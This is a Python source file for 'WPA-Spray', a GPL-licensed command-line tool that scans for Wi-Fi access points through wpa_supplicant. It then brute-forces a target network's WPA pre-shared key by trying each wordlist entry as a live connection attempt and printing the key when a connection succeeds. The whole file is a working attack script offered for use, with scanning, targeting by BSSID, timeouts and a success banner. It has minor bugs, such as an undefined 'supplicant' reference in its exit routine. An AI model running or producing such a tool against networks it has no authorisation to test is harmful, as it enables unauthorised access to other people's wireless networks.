#!/usr/bin/env python3

"""
Author: Nodocify

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
"""

import wpa_supplicant.core
from twisted.internet.selectreactor import SelectReactor
import threading
import time
import time
import sys

class wpa_spray(object):
    def __init__(self, interfaceName, wordlist=None, bssid=None, scan=False, timeout=10):
        print(bcolors.WARNING + '[ INIT ] ' + bcolors.ENDC + 'Initializing...')
        try:
            assert interfaceName != None
        except AssertionError:
            error = 'You must specify an interface.'
            self.exit(error)
        self.interfaceName = interfaceName
        self.runScan = scan
        if not self.runScan:
            try:
                with open(wordlist) as f:
                    pass
            except TypeError:
                error = "You must specify a wordlist."
                self.exit(error)
            self.wordlist = self.open_wordlist(wordlist)
            try:
                assert bssid != None
            except AssertionError:
                error = "You must specify a BSSID."
                self.exit(error)
        self.bssid = bssid
        self.reactor, self.t = self.start_reactor()
        self.supplicant, self.interface = self.initialize_interface()
        if timeout != None:
            try:
                self.timeout = int(timeout)
            except:
                error = "Timeout must a number."
                self.exit(error)
        else:
            self.timeout = timeout
        print(bcolors.OKGREEN + '[ INIT ] ' + bcolors.ENDC + 'Complete.')

    def open_wordlist(self, wordlist):
        with open(wordlist) as f:
            for line in f:
                yield line

    def start_reactor(self):
        reactor = SelectReactor()
        t = threading.Thread(target=reactor.run, kwargs={'installSignalHandlers': 0})
        t.setDaemon(True)
        t.start()
        time.sleep(0.1)
        return reactor, t

    def initialize_interface(self):
        driver = wpa_supplicant.core.WpaSupplicantDriver(self.reactor)
        supplicant = driver.connect()
        try:
            interface_path = str(supplicant.get_interface(self.interfaceName)).split(',')[0].split()[1]
        except wpa_supplicant.core.InterfaceUnknown:
            error = "Unknown interface %r, be sure that it is a valid interface." % self.interfaceName
            self.exit(error)
        try:
            interface = supplicant.create_interface(self.interfaceName)
        except wpa_supplicant.core.InterfaceExists:
            supplicant.remove_interface(interface_path)
            interface = supplicant.create_interface(self.interfaceName)
        return supplicant, interface

    def scan(self):
        print(bcolors.WARNING + '[ SCAN ] ' + bcolors.ENDC + 'Scanning for access points...')
        scan_results = self.interface.scan(block=True)
        print(bcolors.OKGREEN + '[ SCAN ] ' + bcolors.ENDC + 'Complete.')
        if self.runScan:
            print(bcolors.OKBLUE + '[ SCAN ] ' + bcolors.ENDC + 'Printing results...')
            header = '{:^17}  {:^30}  {:^9}  {:^7}  {:^6}  {:^8}'.format('BSSID', 'SSID', 'FREQUENCY', 'SIGNAL', 'TYPE', 'KEYMGMT')
            print(header)
            print('-' * len(header))
            for bss in scan_results:
                try:
                    keymgmt = bss.get_rsn()['KeyMgmt'][0]
                    ssid = bss.get_ssid()
                    if len(ssid) > 30:
                        ssid = ssid[:27] + '...'
                    frequency = bss.get_frequency()
                    if frequency > 5000:
                        frequency = "5 Ghz"
                    else:
                        frequency = "2.4 Ghz"
                except:
                    continue
                print('{:17}  {:30}  {:9}  {:3} dBm  {:6}  {:10}'.format(bss.get_bssid(), ssid, frequency, bss.get_signal_dbm(), bss.get_network_type(), keymgmt))
            self.exit()
        else:
            return scan_results

    def run(self):
        scan_results = self.scan()
        print(bcolors.WARNING + '[ SPRAY ] ' + bcolors.ENDC + 'Starting password spray...')
        target_bss = None
        for bss in scan_results:
            if bss.get_bssid() == self.bssid:
                target_bss = bss
                break
        try:
            assert target_bss != None
        except AssertionError:
            error = 'Target BSSID: %r not found.' % self.bssid
            self.exit(error)
        print(bcolors.OKBLUE + '[ SPRAY ] ' + bcolors.ENDC + 'Target: BSSID %r  SSID: %r  Signal: %s dBm' % (bss.get_bssid(), bss.get_ssid(), bss.get_signal_dbm()))
        for line in self.wordlist:
            psk = line.replace('\n','')
            if psk.startswith('#'):
                continue
            if len(psk) < 8 or len(psk) > 63:
                continue
            print(bcolors.OKBLUE + '[ SPRAY ] ' + bcolors.ENDC + 'Trying psk: %r' % psk)
            # TODO: Network_cfg needs to be tailored to the Target
            network_cfg = {'bssid':bss.get_bssid(), 'key_mgmt':'WPA-PSK', 'psk':psk}
            n = self.interface.add_network(network_cfg)
            self.interface.select_network(n.get_path())
            last_state = None
            completed = False
            handshake_seen = False
            start = None
            start_loop = time.time()
            while True:
                state = self.interface.get_state()
                if state != last_state:
                    print(bcolors.WARNING + '[ SPRAY ] ' + bcolors.ENDC + state)
                    last_state = state
                if state == 'completed':
                    completed = True
                    break
                if state == '4way_handshake':
                    handshake_seen = True
                if handshake_seen and state == 'scanning':
                    break
                if self.timeout:
                    if time.time() - start_loop > self.timeout:
                        print(bcolors.OKBLUE + '[ SPRAY ] ' + bcolors.ENDC + 'Timeout reached with no handshake. Advancing...')
                        break

            self.interface.remove_network(n.get_path())
            while self.interface.get_state() != 'inactive':
                continue
            time.sleep(1)
            if completed:
                msgs = ['BSSID: %r' % bss.get_bssid(),
                        'SSID: %r' % bss.get_ssid(),
                        'Pre-Shared Key: %r' % psk]
                longest = len(max(msgs, key=len))
                print(bcolors.OKGREEN + '[ SPRAY ] {:#^{l}}'.format(' SUCCESS! ', l=(longest + 4)) + bcolors.ENDC)
                for msg in msgs:
                    print(bcolors.OKGREEN + '[ SPRAY ] # ' + bcolors.ENDC + '{:<{l}}'.format(msg, l=longest) + bcolors.OKGREEN + ' #' + bcolors.ENDC)
                print(bcolors.OKGREEN + '[ SPRAY ] {:#^{l}}'.format('', l=(longest + 4)) + bcolors.ENDC)
                self.exit()
        print(bcolors.FAIL + '[ SPRAY ] ' + bcolors.ENDC + 'Wordlist complete. Pre-Shared Key not found.')
        self.exit()

    def exit(self, error=None):
        try:
            interface_path = str(supplicant.get_interface(self.interfaceName)).split(',')[0].split()[1]
            supplicant.remove_interface(interface_path)
            self.reactor.stop()
            self.t.join(1)
        except:
            pass
        finally:
            if error:
                msg = bcolors.FAIL + '[ ERROR ] ' + bcolors.ENDC + error
                print(msg)
                sys.exit(1)
            else:
                sys.exit(0)

class bcolors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='WPA-Spray, an attack vector for spraying WPA Pre-Shared Keys against an access point.')
    parser.add_argument('-s', '--scan',
                        action='store_true',
                        default=False,
                        help='Scan for available access points.')
    parser.add_argument('-i', '--interface',
                        action="store",
                        help='Interface to use.')
    parser.add_argument('-w', '--wordlist',
                        action='store',
                        default=None,
                        help="Wordlist to use. 1 password/phrase per line. Passwords less than 8 characters or lines starting with a '#' will be ignored.")
    parser.add_argument('-b', '--bssid',
                        action='store',
                        default=None,
                        help="BSSID of the target access point")
    parser.add_argument('-t', '--timeout',
                        action='store',
                        default=None,
                        help="Timeout to wait for a handshake with each password attempt. Default is no timeout.")

    r = parser.parse_args()
    spray = wpa_spray(wordlist=r.wordlist, interfaceName=r.interface, bssid=r.bssid, scan=r.scan, timeout=r.timeout)
    if r.scan:
        spray.scan()
    else:
        spray.run()
